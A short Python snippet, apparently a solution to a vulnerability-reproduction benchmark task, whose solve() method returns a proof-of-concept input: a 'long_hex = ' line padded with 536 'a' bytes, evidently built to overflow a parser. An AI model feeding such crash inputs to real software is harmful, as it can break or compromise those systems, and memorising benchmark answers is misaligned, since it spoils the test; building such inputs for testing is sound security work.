class Solution:
    def solve(self, src_path: str) -> bytes:
        prefix = b"long_hex = "
        hex_payload = b"a" * 536
        suffix = b"\n"
        poc = prefix + hex_payload + suffix
        return poc
